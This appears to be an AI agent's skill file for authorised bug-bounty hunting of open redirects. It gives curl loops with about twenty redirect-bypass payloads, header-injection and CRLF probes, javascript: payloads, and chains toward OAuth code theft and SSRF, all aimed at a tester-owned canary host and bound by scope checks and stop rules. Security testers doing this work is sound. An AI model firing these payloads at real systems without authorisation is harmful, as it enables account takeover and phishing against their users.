---
name: zp-open-redirect
description: ZeroProtocol hunter for open redirect and unvalidated forwards. Use when a parameter such as next, url, returnTo, dest, continue, redirect_uri or callback decides where a response sends the browser, when a Location header echoes user input, when a login or logout flow returns to a supplied URL, or when a redirect allow-list needs bypass testing. Standalone open redirect is near-worthless - it earns its place as a feeder into OAuth code theft, SSRF filter bypass and token leakage via Referer.
---

# zp-open-redirect - the trusted first hop

**Phase:** 5 | **Gate:** **active.** `zp-scope check <target>` must exit 0 before any request.
Exit 1 refuse and name the pattern · 3 stop · 4 stop.

An open redirect is a **feeder**, not a finding. Of the ~275 most-upvoted open-redirect reports on
HackerOne, 217 paid nothing - filed as standalone phishing vectors. The ones that paid were chained:
a `javascript:` sink, an OAuth code delivered to the reporter's own host, a CRLF split, a host-header
redirect that rewrote reset mail. **Find the redirect in ten minutes, then spend your time on the
second hop.** Filing it alone is justified only where the program says it pays for it.

---

## Procedure

**1. Harvest candidates from what recon already collected** - no packets needed.

```bash
PARAMS='redirect|redirect_to|redirect_uri|redirect_url|redirectUrl|post_logout_redirect_uri|url|u|link|next|nextUrl|return|returnTo|return_to|returnUrl|ReturnUrl|return_path|dest|destination|desturl|continue|goto|go|forward|target|to|out|r|back|backurl|callback|callback_url|checkout_url|success_url|cancel_url|RelayState|image_url|load_url|clickurl|originUrl'
grep -hoE "[?&]($PARAMS)=[^&\"'[:space:]]*" surface/urls.txt js/*.js 2>/dev/null | sort -u
grep -rnE "location\.(href|assign|replace)|window\.open\(|router\.(push|replace)\(|http-equiv=[\"']refresh" js/ 2>/dev/null
```

Path-shaped redirectors count too - `/out/<url>`, `/r/<url>`, `/redirect/<url>`, `/link?u=`. With no
URL corpus yet, feed those patterns to `zp-content-discovery`.

**2. Baseline with a value that is *supposed* to work.** If a legitimate relative path never reaches
`Location`, the parameter does not drive the redirect and the rest is noise.

```bash
H=target.tld; EP="https://$H/login"; P=next
probe(){ curl -sk -o /dev/null -D - --max-time 15 "$1" | grep -iE '^(HTTP/|location:|refresh:)' | tr -d '\r'; }
probe "$EP?$P=/dashboard"
```

**3. Walk the bypass ladder.** Send payloads **raw** - the server must see them exactly as written,
so pre-encode any literal `#`, `&`, `%` or space yourself (`%23`, `%26`, `%25`, `%20`); curl strips
a real `#` as a fragment and never transmits it.

```bash
OOB=zp91234.canary.example      # a host YOU control and can read logs on
for p in "https://$OOB" "//$OOB" "https:$OOB" "https:/$OOB" "////$OOB" "/\\$OOB" "\\/\\/$OOB" \
         "https://$H@$OOB" "https://$H%40$OOB" "https://$H%5C@$OOB" \
         "https://$OOB%23.$H" "https://$OOB%3F.$H" "https://$OOB%2F.$H" "https://$H.$OOB" \
         "https%3A%2F%2F$OOB" "%252f%252f$OOB" "https://$OOB%09" "https://$OOB%20" \
         "/..//$OOB" "/%2f%2f$OOB" "https://$H/..%2f..%2f@$OOB" "http%0d%0a://$OOB"; do
  printf '%-44s ' "$p"
  curl -sk -o /dev/null -D - --max-time 15 "$EP?$P=$p" | grep -i '^location:' | tr -d '\r'; echo
done
```

Any `Location` whose **authority** is `$OOB` is a hit. Read the authority, not the string -
`Location: https://target.tld/x?u=https://$OOB` contains your host and goes nowhere near it.

**4. Classify it - server-side or client-side.** They have different ceilings.

```bash
curl -sk --max-time 15 "$EP?$P=https://$OOB" \
  | grep -iEo "http-equiv=[\"']refresh[^>]*|location\.(href|assign|replace)[^;]{0,80}|window\.open\([^)]{0,80}"
```

| Observation | Class | Ceiling |
|---|---|---|
| `3xx` + `Location: https://$OOB` | server-side | full - chains to SSRF and OAuth |
| `200` + `<meta http-equiv="refresh" content="0;url=...">` | client-side | phishing and OAuth only; no server fetcher will follow it |
| `200` + `location.href = <param>` | client-side DOM | phishing, and **XSS** if a `javascript:`/`data:` scheme survives |
| `Location` with your host only in the query string | nothing | killed |

**5. Let a URL parser adjudicate, then a browser.** Every rung of the ladder is a disagreement
between the validator's parser and the navigator's. Make it visible.

```bash
python3 - <<'EOF'
from urllib.parse import urlsplit, urljoin
base = "https://target.tld/login"
for c in ["//evil.tld", "/\\evil.tld", "https:evil.tld", "https://target.tld@evil.tld",
          "https://evil.tld#@target.tld", "https://target.tld.evil.tld"]:
    s = urlsplit(c)
    print(f"{c:36} stdlib_host={s.netloc!r:26} resolved={urljoin(base, c)}")
EOF
```

`stdlib_host=''` on a payload a browser sends to `evil.tld` is the bug in one line - exactly what a
`startswith("/")` or `urlsplit(...).netloc in ALLOWED` check gets wrong.

The browser is the only authority on where navigation lands. Serve a unique marker on your own host
and confirm it renders:

```bash
# text browser or curl -L - witnesses 3xx chains only, no JS
lynx -dump "$EP?$P=//$OOB" 2>/dev/null | head -5 || curl -skL --max-time 20 "$EP?$P=//$OOB" | head -c 200
# real engine - required for meta refresh and location.href
chromium --headless --disable-gpu --no-sandbox --virtual-time-budget=8000 \
  --dump-dom "$EP?$P=//$OOB" 2>/dev/null | grep -o 'ZP-CANARY-91234'
```

No local engine? `vercel-labs/agent-browser` and `browsh` both drive a real engine from a terminal -
navigate and read the final address bar. The artifact is the same either way: **your hostname in the
address bar with your marker on screen, from a link that starts with the target's domain.**

**6. Header-driven redirects.** The target still has to be the peer, so pin the connection.

```bash
IP=$(dig +short "$H" | grep -E '^[0-9.]+$' | head -1)
for hdr in "X-Forwarded-Host: $OOB" "X-Forwarded-Proto: http" "X-Forwarded-Scheme: http" \
           "X-Forwarded-Port: 1337" "X-Original-URL: /$OOB" "X-Rewrite-URL: /$OOB"; do
  printf '%-32s ' "${hdr%%:*}"
  curl -sk -o /dev/null -D - --max-time 15 "https://$H/login" -H "$hdr" | grep -i '^location:' | tr -d '\r'; echo
done
# absolute Host override, connection still forced to the target
curl -sk -o /dev/null -D - --max-time 15 --resolve "$OOB:443:$IP" "https://$OOB/login" | grep -i '^location:'
```

A `Location` built from `Host`/`X-Forwarded-Host` beats any parameter redirect - the same code
usually builds password-reset links. Hand it to `zp-jwt-oauth` and `zp-cache-poison`.

**7. Build the second hop - this is the whole job.**

| Chain | Shape | Route to |
|---|---|---|
| OAuth code theft | `redirect_uri=https://$H/out?url=https://$OOB/cb`, or prefix/traversal forms `https://$H.$OOB`, `https://$H/oauth/..%2f..%2f@$OOB` | `zp-jwt-oauth` |
| `post_logout_redirect_uri` | the same endpoint, validated far more loosely than `redirect_uri` | `zp-jwt-oauth` |
| SSRF allow-list bypass | fetcher accepts `$H`; give it `https://$H/out?url=http://$OOB/hop2` and confirm hop 2 is unvalidated **before** aiming anywhere internal | `zp-ssrf` |
| Referer token leak | a page whose own URL holds a reset token or `code` redirects off-site; check `Referrer-Policy` is absent or `unsafe-url` | `zp-jwt-oauth` |
| `javascript:` / `data:` accepted | scheme survives into `location.href` - that is one-click XSS, not a redirect | `zp-xss` |
| CRLF in the parameter | `%0d%0a` injects a second header or splits the response | `zp-smuggling`, `zp-cache-poison` |
| Redirect reflected into a cached response | stored redirect for every consumer of that cache key | `zp-cache-poison` |
| Allowed host you can claim | `//sub.$H` where `sub` is a dangling CNAME | `zp-takeover` |

**8. Stop point for this class - state it in the report.** You stop at the `Location` header, or at
your own marker page in a real browser. You do **not** send the link to anyone, host a page imitating
the target's login, capture a code or token belonging to another account, or exchange a code that is
not yours. The OAuth chain is proven with **two accounts you own** and your own canary host.

---

## Probes and payloads

| Payload | Breaks | Positive looks like |
|---|---|---|
| `https://$OOB` | no validation at all | `Location: https://$OOB` |
| `//$OOB` | `startswith("/")` checks - the single most common bug | `Location: //$OOB` |
| `https:$OOB`, `https:/$OOB` | slash-count normalisation; WHATWG inserts the slashes | `Location: https:$OOB` and the browser lands on `$OOB` |
| `/\$OOB`, `\/\/$OOB` | backslash treated as path server-side, as `/` by the browser | relative-looking `Location`, browser goes off-site |
| `https://$H@$OOB`, `https://$H%40$OOB` | `startswith("https://$H")` prefix checks - `$H` is userinfo | `Location` contains both hosts; browser picks `$OOB` |
| `https://$OOB%23.$H`, `https://$OOB%3F.$H` | validators that search for `$H` anywhere in the string | `$H` lands in fragment or query |
| `https://$H.$OOB`, `https://$H$OOB` | unanchored regex / substring allow-lists | authority is a host you registered |
| `https%3A%2F%2F$OOB`, `%252f%252f$OOB` | one decode too few or too many across proxy and origin | decoded form appears in `Location` |
| `/..//$OOB`, `/%2f%2f$OOB` | path-normalisation added by a *previous fix* for this bug | re-opens a patched redirect |
| `https://$OOB%09`, `%20`, `%0d`, `%0a` | whitespace/control stripping differences | host accepted with the trailer dropped |
| `http%0d%0a://$OOB` and `%0d%0aLocation:%20https://$OOB` | CRLF into the response | two `Location` headers, or an injected header |
| `https://$OOB。$H` (U+3002), `https://$OOB.$H.` , punycode homoglyph | IDNA applied by the browser, not the validator | authority resolves to your host |
| `javascript:/*--></script><svg onload=…>`, `data:text/html;base64,…` | scheme allow-list absent | script executes - this is `zp-xss` |
| `2130706433`, `0177.0.0.1`, `[::ffff:127.0.0.1]` | numeric-IP forms in an SSRF-adjacent fetcher | internal host reached - hand to `zp-ssrf` |

Optional tooling if present - `nuclei -l candidates.txt -tags redirect -severity medium,high`, or
`openredirex -l candidates.txt -p payloads.txt`. Neither is required; the loop in step 3 is the whole
technique, and a substring-matching tool reports the first false positive in the next section.

---

## Confirm or kill

| Evidence | Verdict |
|---|---|
| `3xx` with an **authority** you control, reached from an in-scope host | **confirmed open redirect.** Low on its own. Chain before filing |
| the same, plus an OAuth `code`/token delivered to your canary | **confirmed ATO chain.** High/Critical - this is the report |
| `Location` built from `Host`/`X-Forwarded-Host` | confirmed, and higher - check reset mail and the cache |
| `javascript:` or `data:` survives into `location.href` | that is **XSS**, file it as XSS. Higher and unambiguous |
| `%0d%0a` yields a second response header | **CRLF / response splitting.** Higher than the redirect |
| your host appears only in the **query or path** of `Location` | not a redirect. Killed - the classic scanner false positive |
| redirect lands on an interstitial "you are leaving target.tld" page requiring a click | mitigated. Kills the OAuth and SSRF chains. Low at best |
| off-site navigation needs the victim to paste or edit the URL | not one-click. Killed |
| only `/path` relative values are accepted, normalised, and `//` plus `\` are rejected | correctly validated. Killed |
| OAuth `redirect_uri` is exact-matched against a registered value | killed for the OAuth chain; the standalone redirect may still exist |
| redirect works but the host is out of scope, or is a third-party link-tracker | **not yours to report.** Re-run `zp-scope check` |
| redirect only on an endpoint that already requires attacker-supplied credentials | no victim path. Killed |
| a scanner said "vulnerable" and you have no `Location` line of your own | unverified. Killed until you reproduce it by hand |
| program rules list open redirect as out of scope or informational | killed as a standalone; **still worth building the chain** and filing that instead |

Two honest severity notes. A `meta refresh` or `location.href` redirect cannot be followed by a
server-side fetcher, so it does **not** chain to SSRF - say so rather than implying otherwise. And
"phishing is now possible" is not impact; name the asset the second hop takes.

---

## High-value patterns

- **`/login?next=` and `/logout?returnTo=`** - the two endpoints where this bug actually lives, and where the post-auth redirect happens while a session exists.
- **`post_logout_redirect_uri` and SAML `RelayState`** - consistently validated more loosely than `redirect_uri`, and consistently unhunted.
- **An open redirect on a host that is a registered OAuth callback** - turns exact-match `redirect_uri` validation into code interception. The single highest-value shape in this class.
- **Password-reset and email-verification links** carrying both a token and a redirect parameter - Referer leakage gives token theft with no phishing at all.
- **A redirect built from the `Host` header** - the same builder usually writes reset emails and absolute asset URLs.
- **A previous fix for this exact bug** - re-test `/..//`, `/%2f%2f`, `%252f` against every redirect the program already patched; a bypass-of-the-fix is a fresh finding.
- **Unanchored regex domain validation** (`if "target.com" in host`) - `target.com.attacker.tld`, one-click ATO.
- **Non-Latin and homoglyph authorities** (U+3002 ideographic full stop, trailing dot, punycode) - beat validators and link-blockers that normalise differently from the browser.
- **Link unfurlers, image proxies and PDF renderers** that follow 3xx - an allow-listed first hop is the entire SSRF filter bypass.
- **Mobile deep links and QR handlers** that accept a URL - hand to `zp-mobile`; app-link hijack is a much larger finding.

---

## Pitfalls

- **Filing it standalone.** Four in five of the top-voted reports in this class paid zero. Chain first.
- **Reading the string instead of the authority.** Your host in a query parameter is not a redirect.
- **Trusting `curl` to be the witness for a client-side redirect.** `curl` ignores `meta refresh` and JavaScript; the browser decides.
- **Letting curl re-encode a payload.** A literal `#` never leaves your machine, and `--data-urlencode` double-encodes the very payloads that test double decoding.
- **Calling a `javascript:` sink an open redirect.** It is XSS; the severity and the fix are different.
- **Claiming SSRF from a `meta refresh`.** No server follows it.
- **Pointing a payload at a live third party.** Use a canary host you own - never a real `evil.tld`, a competitor, or another program's asset.
- **Sending the crafted link to a real user, or serving a login clone.** That is phishing; stop at the marker page.
- **Touching another account's OAuth `code`.** Two accounts you own, or no chain.
- **Mass-fuzzing every parameter on every URL.** The ladder is ~20 requests per endpoint; pick login, logout, OAuth and reset.
- **Testing a redirector on an out-of-scope or vendor domain** because it appeared in the target's HTML.
- **Reporting without naming the parser differential.** "The validator uses `startswith`, the browser uses WHATWG" is what gets the bug fixed and the report accepted.

---

## Hand off to

New hostname in the `Location` chain -> `zp-scope` before touching it.
OAuth and token chains -> `zp-jwt-oauth`. Server-side fetchers -> `zp-ssrf`.
`javascript:`/`data:` schemes and DOM sinks -> `zp-xss`. CRLF and header injection ->
`zp-smuggling`, `zp-cache-poison`. Redirector endpoints you have not found yet ->
`zp-content-discovery`; redirect logic in bundles -> `zp-js-secrets`.
Claimable allow-listed subdomain -> `zp-takeover`. Deep links and app links -> `zp-mobile`.
Confirmed chain -> `zp-triage` then `zp-report`.

Class reference cross-checked against `usestrix/strix` (Apache-2.0) `open_redirect`.
